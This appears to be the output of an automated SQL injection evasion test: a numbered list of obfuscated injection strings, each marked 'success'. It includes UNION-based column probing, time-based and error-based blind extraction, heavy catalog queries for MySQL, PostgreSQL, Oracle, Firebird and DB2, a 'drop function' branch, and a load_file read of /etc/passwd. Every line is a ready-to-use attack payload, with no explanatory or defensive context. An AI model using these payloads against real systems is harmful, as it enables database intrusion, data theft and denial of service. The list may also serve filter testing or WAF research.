1 success '-8159 WheRe 2793  =  2793 union all seLEct 0xae9,2793,2793,2793,2793# '
2 success '-(SEleCt 8203)"  )  /*t_\t~@*/union all SeLecT 0x18fa,0x18fa,6394,6394,6394-- '
3 success "1'   )    )    As stnn wHErE 5240 In (5239,5240,5241) And 8881 \t=  7347-- "
7 success "1'\x0bwhere 'N'<>'NG' and True "
8 success "0x1%'/**/union\tall sELeCT\x0cnull,null,null# (seLeCT 4)*"
11 success '(SelecT 1)"   )    )    As xwrq/**/wHERe (seLEct 4161)   likE  /**/4161 '
15 success "0x1%' anD '0Lt='='0Lt=' oR False OR 0xe87!=3719\xa0"
16 success '-9031%"/*?y|Hq*//*+*/)\x0c \x0bORDEr By 1-- e'
20 success "1%'   )   /**/)    waitfor delay/*xsbzw*/'0x0:0:5'-- ]W!"
22 success "select pg_sleep  (  0x5  )   &&    (    (   'vxxg'   like   'vxxg "
24 success '-2378" wHeRE 2686  =  2686  or  867<>868-- lB'
25 success "-4330' union all/**/SELECt 3059,(sELeCt/**/3059),3059,3059,3059,3059,3059,3059,3059-- "
27 success 'iif  (  1878   LIKE   2513,1,1/0  )   '
29 success "end AND    (    (   '0x4' NOT LIKE '4R' "
34 success '-4543"  )/**/ /*OU4\'*/or 113<>114 OR 0 '
36 success '1" where 3943 LIKE 3943 '
37 success "-9014%'  )   union/**/all seLeCt 0x1073,4211,(sELECT 4211),4211,4211,4211# "
39 success '1  ) /**/ union/**/all seLeCt null,null,null,null,null,null-- '
40 success '-0x1c22%" /*Iu]!*/ )    )   \x0bunion all/**/sElEct (SELECt 2901)# Z'
41 success ' seLeCt * FROm/**/users wHEre id  =  1 Or ".  )  " oR (sElecT\x0b1)   lIKE   1 And True/*H*/-- (SELECT 1) I'
42 success "1'||  (  select 'svnn' FROm/*z]*/dual wheRe 8710   Like \n 8710 oR 389 likE 390 AnD True "
45 success '1   )    )    AS wajy WHEre 8593   LIkE   8593 and True Or False '
48 success 'SelECT   (  CAse WheN   (  9393   liKE   5530  )   THeN 9393 ElsE cast  (  0x1 AS int  )  /  (  sELECt 0 FRom dual  )   eND  )   frOM dual-- ll'
49 success 'SeLEct /*dW3XI*/ (\x0c caSE wheN   (  8993/**/  lIke   (sEleCt 8846)  )   TheN 8993 ELsE 8993*  (  SeleCT\x0b(sELEcT 8993) FROm mysql.db /*j*/)   enD  )  # u'
50 success "-9484'/**/or /*V/<_]*/ (  7129  =  2349\x0b\x0b)  *2349 and 'fcsa' like 'fcsa "
53 success "-9653'  ) \n WHEre 2499 NOT LIKE 2500 OR 9323  = /**/9323# "
55 success "-9541  )   aS bnky whEre ',A'<>',A8'\nAnD True and 0x14ec<>5357 anD 831<>832 union all SeLecT 3934,3934,3934#/*f*/"
58 success '0x1   )    )    as xzcl/**/where 8816!=8817 '
61 success " OR 'something'   =   'some'+'thing' "
65 success "-8397'   )    )     )    OR  2171   LikE   4788 "
67 success "-1256' in boolean mode\n )   union all sElecT 0x1ed1,7889,(SELeCT 7889),7889,7889,(SELECt 7889),7889,7889,7889-- ~"
69 success '1  )   && elt  (  7425  =  8842,0x228a  )   aND   (  0x1fa9<>8106 '
70 success '(sElEcT 1)  )   Where 5309  =  0x14bd anD True oR 7552   LIKE     (  SELECT\tcount  (  *  )   From rdb$fields/*[*/as t1,rdb$types aS t2,rdb$collations aS t3,rdb$functions As t4  )  -- }ch '
71 success ' SelEcT * FRoM users WHEre id \x0b=  1 OR/**/1#"? union sELECT null,version  (    )   -- 1 '
72 success 'SElEct '
73 success '1   )    )    AS juoe whEre 0x270a   like  /**/9994 Or 2367   LIKE     (  SeLECt count  (  *  )   FROM rdb$fields aS t1,rdb$types As t2,rdb$collations As\x0ct3,rdb$functions aS t4  )  -- \r'
74 success "-9574'  )   As rxym WheRE 4719  =  4719 OR False union all seLeCt 4719,0x126f,4719,4719,4719,4719,4719-- "
80 success '1 order by/**/1--\x0b'
82 success "1'+  (  select iutk where 6158   LIKE   6158 "
83 success '-4885/**/union all sELect\n4589,4589,4589,4589,4589,4589,4589,4589,4589,4589# '
85 success ' SELeCT * FrOM users wHeRe id   LiKE   1\n|| 1#"1 union SELeCT \'a\',version  (    )   -- 1 '
86 success '-9891"/**/union all sELECt (seLeCt 7489)# '
88 success "(selEct 1)' WhERE 0x21bb   LIKe   8635 order\x0bby (selEct 1)-- Zg"
89 success '1  )   whErE 4992   LIke   0x1380 '
91 success 'if/**/\n(  3593   lIKE   3779  )   SeLect 3593 ELSe droP function\nqtqy-- '
95 success '-4699  )   aS mymz/**/WHERE \'("F%%\' NOT LIKE \'("F%%.\' oR\x0celt  (  (SELECT 1032)   LiKE   1032,3623  )  -- '
96 success ' sELEct * fROm users whEre id   like \t (SElecT 1) oR 1#"{ union SeleCT null,version  (    )   -- 1 '
97 success '-9356 oR elt  (  1032/**/  LIKE \t 1032,3623  )  -- izgi "'
100 success '(sELecT 1)  )   OR 9643   LIKE     (  seLect count  (  *  )   FrOM domain.domains aS t1,domain.columns AS t2,domain.tables As t3 \x0b)   '
101 success '1 where 2060   LIKE   2060 '
102 success "1' wHerE 4253  = \n4253/*V*/"
103 success '1" where\n\'$]wp\' NOT LIKE\t\'$]wp[\' '
106 success '-1447" union all SeLeCt/**/3013,3013,3013,0xbc5,3013,0xbc5,3013-- '
108 success "-0x12dc'+  (  SELect qxnw WHERE (SeleCT 9488)   LIKE   0x2510 or/**/False union all SEleCT (SELecT 9488),9488-- y"
112 success '1"\x0border/**/by 1# '
113 success '-2071/**/union all seLeCt\xa00x1291,4753-- '
114 success "1'\x0bwhere/**/5230  =  5230 "
115 success "0x1  )   waitfor delay\x0c'0:0:(SELECT 5)' AND   (  2993   LIKE   2993 AND/**/True oR False "
117 success '0x1  )   OR 0x1333   liKe     (  SelecT count\x0c (  *  )   FRom domain.domains As t1,domain.columns aS t2,domain.tables AS t3  )/**/ -- '
118 success "seleCt count/**/ (  *  )   froM sysibm.systables aS t1,sysibm.systables aS t2,sysibm.systables as t3 aND    (   \x0c(     (  'vcgc' lIkE 'vcgc "
122 success "0x1'  )   WheRe (sELecT 2120)   LiKE   2120 "
124 success '1" ANd elt  (  0x1099   liKe   4249,7259  )   '
130 success "1   )    )    aS avdz WHERe 4713 IN (4712,4713,4714) AND 9295 NOT LIKE 9296 AND True and '\x0c' NOT LIKE '\x0cl' anD 0x196e   LIKe /**/   (  sElEcT count  (  *  )   frOm sysusers As sys1,sysusers as sys2,sysusers as sys3,sysusers As sys4,sysusers as sys5,sysusers AS sys6,sysusers As sys7  )  -- -G"
132 success "0x1' in boolean mode  )  /*wo*/Or extractvalue  (  0x511,concat\t (  0x5c,0x7171706a71,  (  SELEcT   (\x0b elt  (  1297   lIKE   0x511 And True,0x1   )    )     )  ,0x717a767a71   )    )   #  "
135 success 'SeLECT count  (  *  )/**/  FroM domain.domains/* lkOJ*/As t1,domain.columns as t2,domain.tables as t3# kuqm '
137 success ' having\t5049 IN (5048,5049,5050)--  '
138 success '0x1"   )    )    OR\n0x3fe   LIKE     (  sElect count  (  *  )   From all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  -- '
139 success '1"  )   As rcnk wHere 1800   likE   1800 Or 0 And \'<\'<>\'<<\' '
141 success '1%"/**/ )   aNd 0x1f58 \t Like /**//**/3560-- i^'
143 success "-5528'  )/*_\\*/  union all SelEcT 5153,5153,5153,5153,5153,(sELEct 5153),5153,5153,5153# L"
145 success 'sELEct count  (  *  )   frOm generate_series\x0b (  1,5000000  )   And    (\x0c   (   7240   lIKE   0x1c48 oR 0 '
147 success '0x1"\n )   as fgne WHEre 7207  =\t 7207 or 0 anD True/**/anD 851 like 851 '
148 success 'SElEct *\x0bfROM generate_series  (  9058,9058,cAsE when   (  9058   lIKE   0x49f  )   tHeN 0x1 elSE 0x0 enD  )   limit 1-- o.'
150 success "sElECt count  (  *\x0c )   FrOm generate_series  (  0x1,5000000  )   AnD  \t(  'qpdu'   LIKE   'qpdu "
152 success '1"\t/**/)  /**/where 4101<>4102 && 7942 IN (7941,7942,7943) OR 0 and (SELECT 4595)/**/  LIKE   (SELECT 4595)#/*\rY]?*/i<'
154 success '1" wHerE 7879   Like   7879 '
155 success '1 WHeRe 6100   LIke   6100 And 2716 /**/ like     (  sElEct count  (  *  )   froM sysusers As sys1,sysusers AS sys2,sysusers AS sys3,sysusers as sys4,sysusers AS sys5,sysusers AS sys6,sysusers as sys7  )  -- '
157 success "1%' union/**/all sELecT\x0cnull,null,null-- [&B"
160 success "1  )   WhERE 'a' NOT LIKE 'a[' and exp  (  ~/*t}\t*/ (  SeleCt * FrOm   (  sEleCT concat  (  0x7171706a71,  (  SELEcT   (  elt /*9XB(L*/(  546<>547 OR 1531 NOT LIKE 1531 AND True,0x1   )    )     )\x0c ,0x717a767a71,0x78   )    )   x   ) /*~yw*/  )   -- "
162 success 'Or 1/**/  LIKE   1/* '
163 success "-9370'  )   WHeRE 7070   LIkE   7070 || make_set  (\t 9354   likE   0x248a,7185  )  -- }\x0c"
164 success "0x1'||  (  select 'hwdj' wheRe 6472 IN (6471,0x1948,(SELECT 6473)) "
166 success "1'|| \x0c(  select/**/'ymre' WheRE 0xef2 NOT\x0bLIKE/*6U5Wk*/3827 "
168 success '1"/**/wHeRE (sElect 7796)   like   7796 '
171 success " or\tuserid LikE '% "
177 success '(seleCT 1)"   )    )    As dshc wHERE 9911 /**/ likE   9911 OR 1022   LIKE     (  SeLECT count /**/(  *  )   FroM all_users t1,all_users/**/t2,all_users t3,all_users t4,all_users t5  )\x0b -- '
179 success "1'  )   As rhvm wheRE/**/1420  =  1420 "
181 success '0x1  )   Or elt  (  (SELECT 6272)   LIKE   6272,sleep  (  5   )    )    AnD   (  8600   LIKE   8600 '
183 success 'SelECT Case WHEn 5559   like   3483 THeN 1 elsE null end-- '
184 success '-4152"  )   whERE 5392 NOT LIKE 5393 union all seLect 9781,9781,9781,9781,9781-- '
186 success 'SeLeCT sleep  (  0x5  )\xa0  aND    (    ( \xa0 \t (  "lczw"   LIKE   "lczw '
190 success '(seleCT (sELeCt 0x1))   )    )  '
192 success "-0x135b%' union\x0ball/**/SeleCT/**/0x1728,0x1728-- "
194 success ' sElect * FROm users/*x<0M*/WheRe id   LIKE   1 <@. union sElEcT 0x1,version  (    )   -- 1 &\x0c'
196 success "0x1'/**/union\nall\x0bSElECT null,null,null,null,null,null,null,null# "
197 success "1' /**/)   as yyyb where '~z2<' LIKE '~z2<' OR 'Kl'<>'Kl' AND 'B'<>'Ba'/**/And  \x0c(  0x2242   LIKE   6988  )/**//*T*/*6988-- t"
199 success "SELeCT * FrOM users WHEre id  =  1 or \\<   =  1 OR '\\'<>'\\5' -- 1 "
200 success "1'||  (  select 'etvo' fRom dual wHERE 281 In\n(280,(SElEct 281),282) OR 7016 NOT LIKE 7016 "
202 success '-(seleCt 5591)%"   )    )\x0c   order by/**/1-- u'
203 success ' (  (sELEct 8266)   lIkE   8266\x0b )  *0x26ac '
204 success "-8410'   )    )     )   Or ',E'' NOT LIKE ',E'B' Or 6703 liKE 6704-- "
208 success "0x1' IN boolean/**/mode  )   aNd sleep  (  (sElECT 0x5)\t )  # P}"
209 success '0x1" WHeRe 2642 \x0b=  2642 OR 8315  =    (  seLEct count  (  *  )   FroM sysibm.systables As t1,sysibm.systables/*AzEL*/aS t2,sysibm.systables AS t3  )  -- '
211 success ' END And "%"   LIKE   " '
212 success "1'+  (  SELeCT yjyp WHERe 9696  =  9696 "
215 success "1'\t  )  /**/ )    AS tcby WHerE 5213   LiKe  /**/5213 "
217 success "SEleCT sleep  (  0x5  )   &&    (    (/*O]tPB*/    (  'iwwa' lIkE/**/'iwwa/**/"
222 success "1' WhERE 2661   Like\x0b  2661 "
223 success "-0x1115'+\x0b (  select/**/'rlht' where 'A' NOT LIKE 'A^'\tunion all SelEct 0x8ed,2285,(sElECt/*,,*/2285)# M\t"
226 success "0x1' in/**/boolean mode  )   AnD 0x165d   liKe   5552# P"
227 success 'sElECt * FRom users whErE id  =  1 +  \n(  \\+  )   OR 1  =  0x1 -- 1 '
228 success "1'/**/where 4945  =\n 4945 OR '1#'t[' NOT LIKE '1#'t[' "
230 success '\x0b(  sELect   (  cASE WhEn   (  1570   LIKE   (SeLeCT 0x1b41)  )   thEN 1\nELSe 1570*  (  seLeCt 1570 FrOM mysql.db  )   eND   )    )  '
232 success "0x1'  )\xa0/*oHs*/ union/**/all SELECt null,null,null,null,null,null-- im|0x1"
237 success '1 union/**/all seLEcT null,null,null,null,null,null,null,null# k'
238 success "1'+/**/ ( \tselect 'tjvt'\x0bwhere 4892<>4893 "
239 success '1"   )\t   )    As xbhp WheRE \'s\'<>\'s:\' '
242 success 'SelEct\npg_sleep  (  0x5  )/**/  ANd "%"   lIKE   " '
243 success "0x1' rlike/**/sleep  (\x0b 5  )\xa0 # "
245 success "0x1'  )   aNd 8407   LIKE     (  selecT count  (  *  ) \x0c fROm generate_series\x0c (  (SelecT (seLect 0x1)),5000000/**/\x0c )    )    "
246 success 'sELecT sleep  (  0x5  )   &&    (    ( \t/* GFP*/8679   like   (sElect 8679) '
248 success '-2276"   )    )    as qwow whErE 2321   LIKe \x0c 2321 ANd True Or False oR 3534   like   2971-- d'
250 success "1'\x0c )   wHERE\x0c8211   LIKE   8211 union all SElEcT null,null,null,null,null# "
251 success "0x1'   )    )     )   OR 0x93f   Like     (  sElecT count  (  *  )\x0b  fROM rdb$fields aS t1,rdb$types As t2,rdb$collations AS t3,rdb$functions aS t4  )  -- "
255 success ' SELEct * fROM users WHEre id  =  \'0x1\' union seLeCT $["],@@VERSION -- 1\' '
256 success 'sELeCT * FrOM\tinformation_schema.tables-- '
258 success '1"  )   as jqli where \'30{\x0c!\' NOT LIKE \'30{\x0c!(\' '
259 success 'sElECT   (  cAse WHEN   (  0x1648  =  4125  )   thEn 5704 ELse cast  (  0x1 AS int  )  /  (  SElEct 0 fRoM dual  )   eNd  )   FroM dual-- '
260 success '0x1  )   aS cejp wHErE 4736  =  4736 AND 5932!=5933 OR 0 oR 5286   like     (  sELEcT count  (  *  )   froM all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  -- gvt'
269 success ' SeleCt * FROm users wHErE id   LiKE   1\x0bOR "1{" or \'CN6aR\'!=\'CN6aR"\' -- 1 '
275 success 'declare @s varchar  (  (sElECt 0x16)\n )   sELeCt @s    LIKE   '
276 success '1" wHeRe 0x652   LiKE   0x652 OR 8156   LIkE     (  seLect count  (  *  )   fRoM generate_series  (  1,5000000   )    ) /**/ --/*nXh*/'
281 success 'as/**/'
282 success "(seLEct 1)' aNd elt  (\t\n0x90a<>0x90b,(seLeCT 7259)  )/**^?@*/  "
284 success "-1084 WhERE 1181  =  1181 anD True aND\x0b'Nx'<>'Nx\\' oR/**/make_set  (  9354  =  9354 OR 'V' LIKE 'Vi',7185  )  -- Z,"
287 success "1  )   aNd 8514   liKE     (  sElecT count  (  *  )   FROm domain.domains\x0cas t1,domain.columns AS t2,domain.tables As\nt3  )   and   (  'h' not like 'hj'/*hyY'E*/or 5968 NOT IN (5967,5968,5969) ANd\n1 "
295 success "1' aND updatexml  (\xa0 3393,concat  (  0x2e,0x7171706a71,  (  SELeCt   (  elt  (\n 0xd41\xa0  LIKE   (seleCt 3393) anD/*KYr`F*/1,1   )    )     )  ,0x717a767a71  )  ,1161  )   "
297 success '-2453"  )   union\x0call selECt 4520,4520,4520,4520,4520,0x11a8,4520,4520,4520,4520-- fx'
301 success "0x1'  ) /*-*/ union\nall SelEcT/*q,Dn-*/null# Fh>\rj"
302 success "(sELeCT 0x1)'||  ( /**/select 'xugb' FrOM dual wHErE\x0c'iaZ'<>'iaZ.' "
303 success ' SelEcT * frOm users wHERe\x0cid  =  (SeleCT 0x1)/**/Or 1#"$ union SelecT \'a\',version  (    )   -- 0x1 '
305 success "SelECt * fROm users WheRE id  =  '0x1' OR $<\\ OR 2660 IN (2659,2660,2661) -- (SELECT 1)' "
306 success '1"\n )   WHeRe \'(0x9\'<>\'(9F\' AND/**/5105 IN/**/(5104,5105,5106) '
310 success ' end &&    ( \x0c  (     (  "memh" like "memh '
311 success ' SELEcT *\x0cfROm users WhEre id   LIKE   0x1 or ";#" or \'"p\'=\'"p\' OR False --/*]H,*/1 z2p">'
313 success "(SelecT 1)'+  (  sELECT taga wherE 8036   like   8036 "
314 success '-8639  )   OR\x0b8138   LikE   0x186c '
316 success ' (  SeLeCT   (  cASe\x0cwhen   (  (SELECT 6035)   LIKE  /**/9882  )   THEN 6035 ElsE 0x1793*  (  SeLeCt 6035 FrOM mysql.db  )   eNd   )    )  '
318 success "1'+  (  select gqez where 3704   like   3704 AND 4094 LIKE 4094 OR 0 "
319 success '-7416" wHeRe \'v I\' NOT\x0bLIKE \'v Ib\' order by/**/1-- '
321 success '1  )   whEre 5629/**/  lIKe \t 5629 '
322 success 'IF  (\x0b/*raogu*/3392   lIke   0x1146  )   SelecT (Select (selEcT 0xd40)) elSe dRoP function xsqq-- '
324 success '-5520%"\nunion/**/all\tseLEct 5235,5235,5235,5235,5235,5235,0x1473,5235,5235,5235-- |X'
325 success "1',  (  SeLecT   (  cAse whEN   (  7616   LiKE   7616 /**/)   THen 0x1 else 1/  (  SelECt 0  )   eNd /**/ )    )/*a`\t7d*/  \x0b"
327 success "1'  )   WHere 8707  =  8707 And\xa03210  = /*GG\\1j*/1477-- "
328 success '-3130  )   union all SeLEcT/**/1741,1741,1741,1741,1741,1741,1741,1741# '
330 success '1%"\x0c/*SC*/)   && 571<>572--\x0c'
332 success "-9393'/**/WHERe 3119   LIKE   0xc2f or 'l'!='l^'-- "
334 success "-3775'  )   AS rqet WherE 7092  =  7092 OR elt  (  4899 IN (4898,4899,4900),3623  )  -- "
335 success " union SeLECt 1,load_file  (  '/etc/passwd'  )  ,1,1,1; "
336 success '1 OR 0x2112   likE   benchmark  (  5000000,md5  (  0x694a4745/**/  )  \n )   # irvm U'
337 success "-2855'/**/union all SElEcT 2495,2495,2495,2495,2495,2495,2495,2495,2495-- +}p*id"
338 success '-8629 WhERe 0x1f71   LIKE   8049\x0b&& True union all SElECt 8049,8049,8049,8049,8049,8049,8049# K'
339 success '1  )   aS mixt WHere 1085  =  1085 Or sleep  (  5  )  -- '
342 success "0x1'  )  \twhERe 0x1a4b  =  6731 or elt  ( /*LtJp*/8704 NOT LIKE 8705 OR False,sleep\x0c ( /**/5   )    )   # "
346 success '1%"/**/and 2805  =  1345 '
351 success "(SELECT 0x1)' iN boolean mode  )   ANd 0xef0   LIKE   benchmark  (  5000000,md5  (  0x76555642   )    )   # "
352 success '%27 Or (seLECt 1)   liKe   1 Or False '
358 success '1"  )   AS zuzm WHERE \'M~\' LIke \'M~\' && elt  (  5458  \tlIKE   2966,2966  )  -- |!'
359 success "1'+  (\n sElEct oogh WhERe (SELECT 1167)  =  1167 OR elt  (  5873   LIKE   5873,sleep  (  5   )    )   # ZGSd6"
360 success "1' iN boolean mode\x0c )   && 9198   LIkE   (SeleCt 0x23ee)-- t"
361 success 'iif  (  3760   LIKE   4785,1,1/0  )   '
365 success "-5386'  )   union all SElEcT 8026,0x1f5a,8026,8026,8026,8026# "
366 success '-4165" where\n4993\x0cNOT LIKE 4994 AND 2737 IN (2736,2737,2738) or 4125<>4125/*!*/union all/**/select 1772,1772,1772,1772,1772,1772,1772,1772-- Ik'
367 success ' (  sElECT   (  CASe when   (  1421   LIkE   1421  ) \x0b then (sEleCt 1) eLsE 1421*  (  SelEct 1421 FroM master..sysdatabases  )  /**/eND   )    )  '
371 success '0x1   )    )   \x0b )   union/**/all SELeCt null,null,null,null,null,null,null,null,null,null-- '
373 success '1  )   oR elt \n(  0x16f1   LIKE   0x16f1,sleep  (  5  /*N\nCWK*/) \x0c  )   # PJ'
376 success "0x1' And 2716  =    (  sELecT count/**/ (  *  )   fRom sysusers/**/as sys1,sysusers AS sys2,sysusers as/*S*/sys3,sysusers As sys4,sysusers AS sys5,sysusers aS sys6,sysusers as sys7 \xa0)  -- "
377 success '(SeleCt 1)  )   aND 8514   LIKE     (  SELECt count  (  *  )   From domain.domains aS t1,domain.columns As t2,domain.tables As/**/t3  )   '
378 success 'seLEcT   (  cASE WheN   (  7217/**/  LIKE   7631 /*SKu0*/)   TheN 7217 ELse 7217*  (  SELeCt 7217 FrOm information_schema.character_sets  )   end  )\t # '
379 success "SeLEcT * frOm users WHeRe id\xa0 =  '1' *$ 0x1 or 0x1d2b In (0x1d2a,7467,7468) -- 1' "
384 success '(SEleCt 0x1) \n)  \x0baS lisg wHERe (SELecT 0x1572)   LIKE   0x1572 '
385 success '-(SEleCT\x0b6662)"   ) /**/  )  /*$$i?W*//**/union all SeLeCT 6755-- '
386 success '0x1   )    )   /**/AS rvex whERE (seLECt 3462)   LIKE   (SELECT 3462) aND (seLeCT 4595) \xa0=\x0b 0x11f3# L'
388 success '-4494 OR 5291  =  4452 '
389 success 'waitfor delay \'0x0:0:(SELECT 5)\' aNd   (  "dmcu"   LIKE   "dmcu '
391 success "1'||/**/ (  select 'lljg' from/*Z4@X*/dual wheRe 7352<>7353 "
392 success "1  )   AS/*tqO&*/wype WherE '\r' LiKe '\r' OR (seLect 8315)   LIKE     (  SeLECt count  (  *  )   From sysibm.systables AS t1,sysibm.systables AS t2,sysibm.systables As t3/*\n,)w*/ )  -- "
394 success "1'+  ( /**/select 'vabj' Where 7178   LIke   7178 OR 0 union all sELEcT null,null,null,null,null# "
397 success '1,  (  sELeCt   (  cAse WhEn  \n(  7379 not like 7380 aND\x0b1551 LikE 1551  )   theN   (  SelECt count  (  *  )   FRoM all_users t1,all_users t2,all_users t3,all_users t4,all_users/**/t5  )   elSe 0x1/  (  SElEcT 0 froM dual  )  /**/enD  )   from dual  )   '
398 success '-9860  )   WHerE 521=521 union all SElecT 8743,8743,8743,8743,8743,8743,8743-- '
401 success 'sElecT benchmark  (  (SELECT 5000000),md5  (  0x4c4d6142   ) \t  )    anD\x0b  \xa0(    (     (  9847   LIKE   0x2677 '
402 success '1  )   WHErE 8671  =  8671 && make_set  (  4931   LIKe   1642,1642  )  --\t'
408 success '0x1%"   )    )/**/    )   && (sEleCT 0xa9c)   LikE     (  sElEct count  (  *  ) /**/ fROM sysusers aS sys1,sysusers AS sys2,sysusers as sys3,sysusers aS sys4,sysusers As sys5,sysusers AS sys6,sysusers AS sys7  )  -- '
409 success 'iif  (\x0b 1157   LIKE   4542,1,1/0  )   '
412 success "sELECt/**/pg_sleep  (  5  )\n  And\xa0'zfyy'   LIKE   'zfyy "
415 success 'SEleCT   (  CaSE when  /*VIKD<*/(  (SELECT 4061)   like   1396  )   tHEN 4061 elsE 0x1/  (  SELeCt 0  )   eND  )  --\x0b"L'
416 success "-9509'  )   where 9303   LIKE   9303 order by 1# "
417 success "1  )   as qodq WHERE '`'<>'`F' OR/**/9643   like /*}F*/   (  SelecT count  (  *  ) \t FroM domain.domains As t1,domain.columns As t2,domain.tables aS t3  )  -- "
423 success 'iif  ( \x0b0x20a2   liKe   3515,1,1/0  )   '
434 success 'seLeCT CaSe when 9390  =/**/ 5752/**/thEN 0x1 elsE\tnull/*2\r*/enD-- '
435 success '1" && elt  (  4594   like   1040,1040  )   '
440 success 'sEleCt count  (  *  )   FroM domain.domains/*J-f\n*/AS t1,domain.columns as t2,domain.tables As t3 And    (    (   "vqpx" liKE "vqpx '
442 success 'SElECT   (  CasE WhEN   (  9986   LiKe   8342  )   ThEN 9986 ElSe/**/9986*  (  SelECt 9986 FrOm information_schema.character_sets  )   eNd  )  # '
443 success "0x1   )    )    oR 0x207b   Like     (  SELeCT count  (  *  )   FrOM sysibm.systables as t1,sysibm.systables aS t2,sysibm.systables as/*fmmi*/t3\xa0 )   aNd    (    (   'f'!='f4' || False "
444 success "1'  )   AND 'Ix,~'!='Ix,~}' OR 'c' LIKE 'c5' "
446 success "-1621'/**/In/* -}m}*/boolean mode  ) /**/\norder by\t1-- n"
447 success '1"  )   aS pobe WHERE 4060 lIke 4060 '
448 success "1 wHERe '>' NOT LIKE '>E' AnD\t(sELECt 34) IN (33,34,35) union all/**/SelEct null,null,null,null# "
451 success "-7868' In boolean mode \x0b)  /**/union all sElECt 5117,5117,5117,5117,5117,5117,5117,5117,5117#\x0b!j"
452 success '/*TJ-*/sELEct sleep  (  0x5 \n)  /*`(*/ANd "%"  \x0clIke   " '
453 success "-4205' union all/**/sELeCt 8986,8986,8986,8986,8986,8986,8986,8986,8986,8986# "
455 success 'SELEcT   (  case WhEN   (  7254   LIKE   5901  )   THEn 1 ElSE 7254*  (  sELECt 7254 FroM master..sysdatabases  )   EnD  )  -- '
457 success '1"  )   AS ebvt WHERe 5305  =  0x14b9 '
458 success "(SELECT (SELECT/**/1))%'  )/*5m1*/\n\tunion/**/all seLEcT/**/null# "
459 success '-9871"  )  /**/union all SeLECT/*X.3*/0x237a# '
460 success "-6368'\nunion all seLecT 6529,0x1981,6529--\xa0"
461 success '1   )    )    anD 9254/*p\x0b*/  lIke     (  SELect count  (  *  )   FroM rdb$fields AS t1,rdb$types AS t2,rdb$collations aS t3,rdb$functions AS t4  )  -- '
462 success '1,  (  SElECT   ( \x0bcase wHen   (  1570   LIKe   1570 aND True  )   tHeN   (  SElect (sELECT 1570) From pg_sleep  (  5   )    )    ELSE 1/  (  SeLeCt 0  )   eNd   )    )    '
463 success '1"   )    )    AS nncz WhErE 6127<>6128 '
464 success '0x1" aND exp  (  ~  (  seLecT * FROm   (  SELEcT concat  (  0x7171706a71,  (  seLeCt   (  elt  (/*\n-_q*/ (SELECT 0x1ffe)   LIKE   0x1ffe,0x1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    '
467 success '0x1" whERe 0x963   LIKE   2403 oR 4915  =    (  SELECT count  (  *  )   froM domain.domains As t1,domain.columns As t2,domain.tables AS t3  )  -- U,6=#'
470 success 'SELECt caSe whEN 7951  =  1147 THeN (SelEct 1) ElSE null ENd-- '
472 success '1"   )   /*-**/)   \x0baS rrms WHEre 8185   LIKE   8185 || False Or False union all SelECt\x0cnull,null,null,null,null,null,null,null-- {Q'
473 success '-8203   ) /**/  )\n   AS eqlf whEre 607 NOT LIKE 608 union all sELeCt 6132,6132,6132,6132,6132,6132,6132,6132,6132-- '
477 success "-7371'  )  /**/union all SeleCT\xa04531,4531,4531#\xa0G"
478 success '-4191  )  /**/order by 0x1# w'
479 success '1"  )  /*otvo*/as nyzd/**/where 0x14b9  =  5305 '
481 success ' sElecT * FrOm users\x0bWhErE id\t  LIKE   1\x0bOR ".]" oR (SeLEcT 0x1)  =  0x1 -- (SELECT 0x1) T#,'
482 success 'SeLeCt count  (  *  )   fRom domain.domains AS t1,domain.columns AS t2,domain.tables As t3 &&    (   \x0c(     (  "%"   LIKE   " '
484 success "-(SelECT 9672)'   )    )    As rupb WHERe 8218  =  8218 Or make_set/**/ (  4954   lIke   1836,1836  )  -- "
485 success '-6546"  )/*Mu*/ \x0border/**/by 1# '
488 success '1" wherE \'j\' NOT LIKE/*7U*/\'jz\' OR \',Z\' LiKE \',Z8\' anD elt  (  \'u?J[v\' NOT LIKE \'u?J[v!\',sleep  (  (selecT 0x5)   )    )   -- '
490 success ' SeLECt *\tfrOM users WHERe id   liKe   1 Or\t"{." oR \'!\'!=\'!L\' -- 1 qTc'
491 success '0x1  )   AnD 0x196e  =    ( \x0bSeLecT count  (  */*y\\U*/ )   frOm sysusers aS sys1,sysusers aS sys2,sysusers As sys3,sysusers aS sys4,sysusers As sys5,sysusers as sys6,sysusers aS sys7  )   '
494 success '1" where 7110   LIKE   0x1bc6\n'
496 success "-1591/**/wHerE 9991!=9992 Or 'gv'<>'gv' union\tall selEct\n3291,3291,3291,3291,3291,3291,0xcdb,0xcdb,3291# "
497 success "1 WHERE 7158   LIke   7158 aND 1\noR elt  (  '4oI|I'/*&*/NOT LIKE '4oI|It',sleep  (  (selECT 5)   )    )\xa0  # "
498 success 'sEleCt * from\x0cusers Where id   LikE   1 +  (  1 \t)   OR 1   LiKe   0x1 -- 1 '
499 success "OR 'something'    like    'some'+'thing' "
501 success '1   )    )    aS shmg WHerE 1371   LiKE   1371 union all seLEcT null,null,null,null,null,null,null,null,null,null#/*$I7*/'
502 success '-(SELecT 0x1bc7)%" union\tall/**/seLECT 6083,6083,6083,(Select 6083),6083,6083--\x0c'
503 success '-8633" or 5099   LIKE /**/ 5974 '
505 success '-8143 union all/**/select 4492,4492,4492,4492,4492,4492,4492,4492,4492# '
506 success 'sEleCT * frOm generate_series  (  1488,1488,cAse When   (  1488   likE   1685  )   ThEn 1 ELsE 0\x0bEnd \t)   limit (SELEcT 1)-- '
507 success 'sELect   (  CAsE WHeN   (  4043   like   5276  )   TheN 4043 else 4043*  (  sElecT/**/4043 frOM information_schema.character_sets \t)   end  )  # .r'
509 success '1\x0bunion all/**/select null,null,null,null,null,null,null,null,null# \\B'
511 success "1'\nin boolean mode  )   OR (SelECt 2367)   LIKE    /*D`B*/(  selEct count  (  *  )   FRoM rdb$fields aS t1,rdb$types aS t2,rdb$collations as t3,rdb$functions As t4  )  -- "
513 success '-2211" oR 2113   LIKE\n /**/8885# '
514 success "1'+  (  SELECt hett WhERE (SeleCT 7228) /**/ liKe   (sElect 7228) "
516 success "waitfor delay '0:0:5'/*@%0x9*/&& '%'   LIKE   '/**/"
517 success "-5708 wHerE 'o2m' not like 'o2mn' Or 0x170f \n LIKE     ( \xa0'qqpjq'|| \x0b(  Select cAsE (sELECt 5903) wheN 0x170f THEn (SElect 0x1) eLsE 0 END From rdb$database  )  ||'qzvzq'  )  --\x0ct"
518 success 'Select   (  cASE wHen   (  9299   liKe  /*":/*/2760  )   then 1 eLsE/**/9299* \x0c(  seleCT 9299 fROM master..sysdatabases  )   enD  )  --\x0b'
